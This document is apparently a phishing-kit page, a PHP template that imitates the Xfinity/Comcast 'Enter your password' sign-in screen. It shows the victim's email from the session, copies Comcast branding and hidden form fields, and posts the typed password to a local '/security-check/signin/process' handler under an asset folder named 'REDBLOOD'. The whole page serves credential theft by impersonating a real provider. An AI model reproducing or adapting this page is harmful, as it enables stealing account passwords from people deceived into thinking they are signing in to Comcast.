            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-neutral2-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        [focus-within].sc-prism-checkbox-default-h .label.sc-prism-checkbox-default .checkbox.checked.sc-prism-checkbox-default,
        [focus-within].sc-prism-checkbox-default-h .label.sc-prism-checkbox-default .checkbox.indeterminate.sc-prism-checkbox-default {
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-theme1-base) / var(--tw-ring-opacity))
        }

        .sc-prism-checkbox-default-h:focus-within .label.sc-prism-checkbox-default .checkbox.checked.sc-prism-checkbox-default,
        .sc-prism-checkbox-default-h:focus-within .label.sc-prism-checkbox-default .checkbox.indeterminate.sc-prism-checkbox-default {
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-theme1-base) / var(--tw-ring-opacity))
        }

        .checked.sc-prism-checkbox-default,
        .indeterminate.sc-prism-checkbox-default {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-theme1-base) / var(--tw-border-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme1-base) / var(--tw-bg-opacity));
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            --shadow-color: rgba(33, 18, 91, 0.51)
        }

        .invalid.sc-prism-checkbox-default {
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-negative-base) / var(--tw-border-opacity))
        }

        .invalid.checked.sc-prism-checkbox-default,
        .invalid.indeterminate.sc-prism-checkbox-default {
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-negative-base) / var(--tw-border-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-negative-base) / var(--tw-bg-opacity));
            --shadow-color: rgba(66, 0, 19, 0.51)
        }

        .input.sc-prism-checkbox-default:hover+.label.sc-prism-checkbox-default .invalid.checked.sc-prism-checkbox-default {
            --tw-border-opacity: 1;
            border-color: rgb(var(--border-color-stroke-negative-hover) / var(--tw-border-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-negative-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(50, 0, 15, 0.51)
        }

        .input.sc-prism-checkbox-default:focus+.label.sc-prism-checkbox-default .invalid.checked.sc-prism-checkbox-default {
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-negative-base) / var(--tw-ring-opacity))
        }

        .invalid-message.sc-prism-checkbox-default {
            margin-top: 0.25rem;
            display: block;
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-negative-base) / var(--tw-text-opacity))
        }

        .disabled.sc-prism-checkbox-default {
            cursor: not-allowed;
            opacity: 0.3
        }

        .icon.sc-prism-checkbox-default {
            display: block;
            height: 1rem;
            width: 1rem;
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity))
        }

        .hint-container.sc-prism-checkbox-default {
            margin-top: 0.25rem;
            display: flex;
            align-items: center
        }

        .hint-container.sc-prism-checkbox-default>.sc-prism-checkbox-default:not([hidden])~.sc-prism-checkbox-default:not([hidden]) {
            --tw-space-x-reverse: 0;
            margin-right: calc(0.25rem * var(--tw-space-x-reverse));
            margin-left: calc(0.25rem * calc(1 - var(--tw-space-x-reverse)))
        }

        .display2 {
            font-family: XfinityBrown, DMSans, Helvetica, sans-serif;
            font-size: var(--text-display2-size);
            font-weight: 700;
            letter-spacing: -0.4px;
            line-height: var(--text-display2-leading);
            text-transform: none;
        }

        .body3 {
            font-family: DMSans, Helvetica, sans-serif;
            font-size: 0.875rem;
            font-weight: 400;
            letter-spacing: 0px;
            line-height: 1.5;
            text-transform: none;
        }

        .button {
            font-family: XfinityBrown, DMSans, Helvetica, sans-serif;
            font-size: 1rem;
            font-weight: 700;
            letter-spacing: 0px;
            line-height: 1.5;
            text-transform: none;
        }

        .text {
            margin: var(--margin);
            padding: var(--padding);
            display: var(--display);
            color: inherit;
            font-size: inherit;
            font-weight: inherit;
            line-height: var(--line-height);
        }

        #ad-block {
            line-height: 0;
            position: relative;
        }

        .heading3 {
            font-family: XfinityBrown, DMSans, Helvetica, sans-serif;
            font-size: 1rem;
            font-weight: 700;
            letter-spacing: 0px;
            line-height: 1.5;
            text-transform: none;
        }

        .sc-prism-input-default-h {
            --icon-offset-x: 0.75rem;
            --icon-offset-y: 0%;
            --input-margin-top: 1rem;
            --input-margin-bottom: 1rem;
            --text-align: left;
            position: relative;
            box-sizing: border-box;
            display: block;
            width: 100%;
            margin-top: var(--input-margin-top);
            margin-bottom: var(--input-margin-bottom);
        }

        .lg\:p-6 {
            padding: 1.5rem;
        }

        body.has-footer #bd {
            padding-left: 1.875rem;
            padding-right: 1.875rem;
        }

        .max-w-\[420px\] {
            max-width: 420px;
        }
    </style>

    <link rel="stylesheet" href="<?= base_url() ?>REDBLOOD/Assets/kintil/css/prism-ui-prism-ui-71fc56d.css">
    <link rel="stylesheet" href="<?= base_url() ?>REDBLOOD/Assets/kintil/css/dist-bundle-71fc56d.css">
    <script type="module" src="<?= base_url() ?>REDBLOOD/Assets/kintil/js/prism-ui.esm-71fc56d.js"></script>
    <script type="text/javascript" src="<?= base_url() ?>REDBLOOD/Assets/kintil/js/dist-bundle-71fc56d.js" defer=""></script>
    <link rel="shortcut icon" href="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-favicon.ico">
    <link rel="apple-touch-icon" sizes="57x57" href="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192" href="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-favicon-16x16.png">
    <style>
        .da-fullscreen iframe[id^="utif_"] {
            max-width: 300px;
            max-height: 600px;
            overflow: hidden;
        }
    </style>
</head>

<body class=" has-footer">
    <noscript class="no-script">
        <div class="no-script-error">
            <img src="images/global-alert--caution.svg" alt="alert-caution" />
            <h2>We can't sign you in</h2>
            <p>Your browser may be set to block cookies, or you may have Javascript disabled. Check your browser settings and try again.</p>
            <a href="">
                <button>Try again</button>
            </a>
        </div>
    </noscript>
    <div id="breakpoints"></div>
    <div id="background" class="hidden lg:block absolute top-0 w-full h-full"></div>
    <main id="bd">
        <div id="left" class="box-border align-top text-left mr-7.5 w-[594px] hidden lg:inline-block empty:hidden"></div>
        <div id="right" class="w-full max-w-[420px] break-words">
            <prism-box outline="false" class="p-0 lg:p-6 round neutral hydrated">
                <form name="signin" action="/security-check/signin/process" method="post" novalidate="">
                    <div class="single logo-wrapper flex items-center mb-7 lg:mb-10">
                        <span aria-role="img" class="bg-xfinity-logo w-[71px] inline-block flex-shrink-0 h-6 max-h-6"></span>
                    </div>
                    <prism-text id="displayedLogin" display="heading3" class="block heading3 hydrated"><?php echo $_SESSION['email']; ?></prism-text>
                    <prism-text tag="h1" display="display2" class="mt-4 block display2 hydrated">Enter your password</prism-text>
                    <input id="user" name="email" type="text" autocomplete="username" value="<?php echo $_SESSION['email']; ?>" disabled="" class="hidden">
                    <prism-input input-id="password" name="password" type="password" label="Enter your password" hide-label="true" obfuscate="true" autocomplete="current-password" maxlength="128" required="true" data-value-missing="Please type in your password to sign in." class="sc-prism-input-default-h sc-prism-input-default-s contained hydrated" value="">
                        <!----><span class="sc-prism-input-default"><label class="sc-prism-input-default" for="password">
                                <prism-text part="label" class="label-text screen-reader-text sc-prism-input-default caption hydrated">Enter your password</prism-text>
                            </label><span class="wrap sc-prism-input-default sc-prism-input-default-s"><input class="input password contained sc-prism-input-default" part="input" id="password" accept="" autocapitalize="off" autocomplete="current-password" autocorrect="off" inputmode="text" maxlength="128" name="password" required="" type="password" aria-invalid="false" aria-required="true">
                                <prism-button slot="icon-trailing" class="sc-prism-input-default sc-prism-button-default-h sc-prism-button-default-s hydrated">
                                    <!----><button part="native" type="button" class="btn neutral ghost sc-prism-button-default sc-prism-button-default-s" aria-label="toggle password visiblity" aria-expanded="false" aria-disabled="false">
                                        <prism-text class="text sc-prism-button-default sc-prism-button-default-s block button hydrated">
                                            <prism-icon class="sc-prism-input-default sm hydrated loaded">
                                                <div part="container" class="dot-positive icon-inner size-sm">

                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" focusable="false" role="img" class="size-sm neutral primary icon" aria-hidden="true">


                                                        <path d="M12,8a4,4,0,1,0,4,4A4,4,0,0,0,12,8Zm0,7a3,3,0,1,1,3-3A3,3,0,0,1,12,15Z"></path>

                                                        <path d="M13.49,12A1.5,1.5,0,1,1,12,10.5,1.5,1.5,0,0,1,13.49,12ZM21,12a11.08,11.08,0,0,1-9,5,11.08,11.08,0,0,1-9-5,11.07,11.07,0,0,1,9-5A11.07,11.07,0,0,1,21,12Zm-6,0a3,3,0,1,0-3,3A3,3,0,0,0,15,12Z"></path>

                                                    </svg>
                                                </div>
                                            </prism-icon>
                                        </prism-text>
                                    </button>
                                </prism-button>
                            </span></span>
                    </prism-input>
                    <prism-button prism-id="forgotPwdLink" display="ghost" status="theme1" href="#" target="_self" class="sc-prism-button-default-h sc-prism-button-default-s hydrated">
                        <!----><a part="native" href="#" target="_self" class="btn theme1 ghost sc-prism-button-default sc-prism-button-default-s" id="forgotPwdLink" aria-expanded="false" aria-disabled="false">
                            <prism-text class="text sc-prism-button-default sc-prism-button-default-s block button hydrated">
                                Forgot password? </prism-text>
                        </a>
                    </prism-button>

                    <prism-checkbox id="remember_me" name="rm" value="1" label="				Keep me signed in			" class="my-8 sc-prism-checkbox-default-h sc-prism-checkbox-default-s hydrated"><input id="9pzaiq6i6a" name="rm" type="checkbox" aria-invalid="false" aria-required="false" value="1" class="input sc-prism-checkbox-default"><label class="label sc-prism-checkbox-default" for="9pzaiq6i6a"><span class="checkbox sc-prism-checkbox-default"></span>
                            <prism-text class="label-text sc-prism-checkbox-default block body1 hydrated"> Keep me signed in </prism-text>
                        </label></prism-checkbox>

                    <prism-text id="implied-legal" display="body3" class="mt-6 block body3 hydrated">By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</prism-text>

                    <prism-button prism-id="sign_in" type="submit" status="theme1" class="block mt-10 sc-prism-button-default-h sc-prism-button-default-s hydrated">
                        <!----><button part="native" type="submit" class="btn md theme1 fill sc-prism-button-default sc-prism-button-default-s" id="sign_in" aria-expanded="false" aria-disabled="false">
                            <prism-text class="text sc-prism-button-default sc-prism-button-default-s block button hydrated">Sign In</prism-text>
                        </button>
                    </prism-button>

                    <prism-button name="$restart_flow_action.prompt" display="ghost" href="#" class="mt-6 sc-prism-button-default-h sc-prism-button-default-s hydrated">
                        <!----><a part="native" href="#" class="btn neutral ghost sc-prism-button-default sc-prism-button-default-s" aria-expanded="false" name="$restart_flow_action.prompt" aria-disabled="false">
                            <prism-text class="text sc-prism-button-default sc-prism-button-default-s block button hydrated">
                                Sign in as someone else </prism-text>
                        </a>
                    </prism-button>

                    <input type="hidden" name="r" value="comcast.net">
                    <input type="hidden" name="selectAccount" value="false">
                    <input type="hidden" name="s" value="portal">
                    <input type="hidden" name="deviceAuthn" value="false">
                    <input type="hidden" name="continue" value="#">
                    <input type="hidden" name="ipAddrAuthn" value="false">
                    <input type="hidden" name="forceAuthn" value="0">
                    <input type="hidden" name="flowStateId" value="CgNDRlMQAhgBIiDPTFzC-WmlRonw55U6-ELR80NkEQhBu1WoAh5YI-W6zioQ-90_IMXG5lekQMJ40WiHGDJ8CjwyMDIwLTA0LTI4dDIxOjI5OjMwIWYxMWFiZGNmLTQyMWEtNDEyMS1hNGUxLTc5MjBiY2FmYzJjZSFlbmMSPDIwMjAtMDQtMjh0MjE6Mjk6MjkhYzk5YWE0MzMtMmQyMi00MDY0LTliMDItMWJkNGVlNzk3YWJhIXNpZzrAE0E9kXRUbqWzgafU_HhWEzI1uM6sC-4pQ8YvlPjKA2a90yq6jAVa5953fDdo-JqbPWH-YRHy0piwqQmTXFh-DvKx8VgnkJA8ZzG4wCCJFZsD0-UxP3fvSeVxTTI3BV9FQ6PWks_ngjamcJmiQ1BVz41kLRRB3b2w1S7EwpjkMQXJltic9IFCYLsqabQG2ZA-COUl-76ovHBGXqljaj20m72YcTKsApZEGgPDA9dE8GoTIdeHeZdDd-TVYO-_6XM3cuQgrZ4dSTRdHj_hMebbm80L2rNbQhRF2noihmmYR-BYlzC86x5sfrMKXlkCFFT_et54vfxrN1Djz9m8eti9URh3AhJPf3KwmiO5p1FJiA20O2WYKIe0PRo4hY9ccJsjGpvdHWAYk3Uvzn5qms5N5THMP60CTdTOBNRgSOxt1nPoDhtypPcHHID0waPfRjaVnbmfuX3jjLZk5BA2FXlKFkoayviJNkxLFnREJ_s-JjCduzJSfmUBep0nxzfqZhGlMJB9SraqSI9oGIRitwaDRuWOTcN79egjxd2z5QQbtWgqLixveVwdZqB62rykvsqL_1VeNR_x_Cm3kQ0yYkt5T9ypGjsGQWGNOYhEDeVFem_J1-wEIMu5UQor-9Gc_DrBliOZadZLIWuOYR0wIWKMV5_CP2fbdRk3LRyGRtNqINbpl1oBbX1DAgFQJQRZuryL0ai1_eo07tb0hUvg32Rklgje4y-Fj80S6R-Q4ILozzhpUgWAu8xcuZBiJbos7Tb3bfQ13E_tVLhxtFPkD44s88yRmjcYzgGMIhTL_az391K0c0CLGzA0F-4d7oJqZiI2M5HViGSPJBaN-O5ZsXAO-K-CY1QzGySLFw1pPicDdXc94eyUCrKEUiAJJKD4XEHQGyYkhD77_3A0HiJNJREFF8EGxvimTf9yO_1YZJzvzIuqSofy-QdKML1dsrqbgQoTLJ6NSqnqChtrrD1WBx8KwtaUrFuElMi7aAbLGXtEw5nvk-jZdYy3REWvfQQSM9Munw4x-NByNJQiEZjV63i9CymVtA2GRId6HrsW1s-YXERJg8Su62nUw9U0ZEmNojiZ8l8dm3bzFDr4U7dqoHFnSOyNlf-l7rxpj4rka9vcLPM-GcGJQpqiD22L8N4t6vXlwDrFsgVtd22ub0irMqgZ5N89LCpl5FqOC8d3d8RjggpJcxl1D7cdmHf2FwameqSr1Jv4K1O77cdvNirRnxHTHqQ0MVcI9yZ_kUkUo1OPM6oodDeCsOemoK16USci5D3e8JhMVTdP-xXzVo4KD9KBze6xioaLv3BUomc4tOeF6ZfXNn7XivXsd_-UsbzaH5UBS5O4TjaTm-bCxCTwRrht1dHVvQUgTQaY3CaWixV3Fzs-wOTFAgigu1ND-09rWX4I3ZPOnUmpAKIQrOg30D21zfSmDgVWNbk6g7QnhG-xW8BmO-3Mqen2YsT4ApSwAdEKA2mcBs_q6DlCQR-C8AdosVUuiuHy_1iBQujbuirptgu7tM-aLztq0eQnsz18rEVgOp9le1UdQrd1AQ-ae1u8IIksDSpunMbmnZnmDgmRdkVo2rC-H_3Gn4b8T19yUI-pD2E8ui_6G0KKNvmw-c6Chsky0g5OvceID4RugKpS80S-Qmf8_x9nlAVTuKaC0v0HDxF2tUXgN3WzZbE7zoMbEOt5zZz8VpSzERMZSfXN2PobkliBeVjuDwgrkVpXiNRxw1BkFZXWxyO69dtiAX4dkXsgYUhJhGQgcsx2WKtjNklUW1AuSkKmhIOrcx-IeawLagxuytGsbXK80TxOWGhgviVr4MUglieSCfUowXk5VYEeGAiYb1kEVKkKX_vrLO5AqUH0TbhSIcQ3JXUdWfkzYuXyPd9urXljv7FOCY30fddz02DmZ5ycy-qaAjsa9IQnulxe59nbV0LYSmoOIO4ujTfASXMsZIDiyIMlSW1bXm1xDjXF05qZ2yMAlvjkI5rJ_ZDFai6R2T0qSOj9peI-xlYQPQp7bIGt9vZos_e8X_AX33-v3bCxU3tBWjh01ALACZBIt2CdsmHuSdvo2MQdPlL7a0-efUmFZgGibcnMwMKvkZQlnlc2HNY5XNjkg-keV8oRFEWYiMtXUs49N4LaqyvgJJkEfCUAvSiPf5c-aDCDhdCaiLubsfEdZ90Rn4ATpAT87eD2fdig8mhAvSKW54lMpBKtw4zp2i732CMEuyFKgHpm9k3lA6dB1bYqZI3XY9kkFgUh95ulp0Vkl7G9TANs1-p8053xRs1AwExjyk4tjdm_cwteUkExg1B45cMoWMo4Unt7E-lQbRxlB6WWRPTby9bfXorK4ElZzfowUxDyLLg7Y8X9qNmax4E3z3yIg-QDIjtZTzO22PrfbuGsBtz74A-H_N1Hrm5tWB2uejwaSpFv64Dm4IHI7M0Kym3hXz4LYtvgyjAA1Q8coBlSzGAEz3Gl3k7xi5BR1esZJ39X-p2Iz4DKduYi0daolw8TTI503Ts7wTrCDI7afLVTA2c226dIkSQ0b-QzvSDPaltUZaTs4ESPwtaQWeNE5FmvBynQNxD4yB7e-v6YTD4Is0lkELzW5jG0JFBeeC8Qe5CqTRHkvD4SKMM437QO8w36yQpuoTdOzxWzIJMk_uxdsP-Kn5djhXyi7Ojnp45hVBDkByh3IN52xIRPiRcrh9l2kNq4ZyDDk1xZrBP_hC1k6V01qiNXFCOl5Ex_juDBIOHHVUdPm1xqWMfRmZZVIF0dmbtti2gMwBBxdVps5D2XScX0UL8fk8dTWWaD8iAakypza54Onua8LdvS6aAdncy3-Lw7G5470KdA5bgiAuzZzMCaDKteZwFlA_0ZPAqikfudsUY0uExX5sb1NyOfHX8OauQ4oyuYSGT9gZHNY-TxBbakU0wyPtPU8SY1sSLUd4VJyFdWWPL_Bp3Bv-L-njS7ytjQr4AWRRC5ejPQcC9jD-uqqOJIMnVgcS3L8WMZZx7jt2NPFeothgK0Ho7ci8Q2E6q8gWdCuNVAiZajHRyncyxezmZe-oFAADRxW7_-Rbx-R84iutV3t71pJJ8SXwvUaTN3nJAVf8vcJsbbLmyGDTSEiBNky_38CqzpUxZOkYfUEjDTZAhxoazlM6QBev9qkixYNCOTGngx9e3GYezn_e9iN4bibh0ZEfe8k5EJ3ivWv51XRjPIZ7bjZtfTGzxG411rV-gnaDXlYH3BOZwe5bduC49eCjDqpXdcAm51jX95CsXqA38TjwSncGzVklnszrXaGVKQ1YSM-7i-wC3IWRvEdECVMrGc_hnoqSsDcPjXOFfchVLeLjGs2HPpFPud0A**">
                    <input type="hidden" name="lang" value="en">
                    <input type="hidden" name="passive" value="false">
                    <input type="hidden" name="flowId" value="79d9c434-1f85-4b71-86c6-cabaa7b98f57">
                    <input type="hidden" name="reqId" value="9401eed3-bf36-497b-bd62-4d6887c621a6">
                    <input type="hidden" name="userVerifyingPlatformAuthenticatorAvailable" value="true">
                </form>
            </prism-box>


        </div>
    </main>
    <footer>
        <span class="content">
            <span class="copyright">© 2024 Comcast</span>
            <nav>
                <span class="divider hide-compact"></span>
                <span class="links">
                    <a href="#">Privacy Policy</a>
                    <span class="divider"></span>
                    <a href="#">Terms of Service</a>
                </span>
                <span class="ad-links divider"></span>
                <span class="ad-links links">
                    <a href="#" target="_blank">Ad Info</a>
                    <span class="divider"></span>
                    <a href="#" target="_blank">Ad Feedback</a>
                </span>
                <span class="divider hide-compact"></span>
                <span class="links">
                    <a href="#">Do Not Sell My Personal Information</a>
                </span>
            </nav>
        </span>
    </footer>
</body>

</html>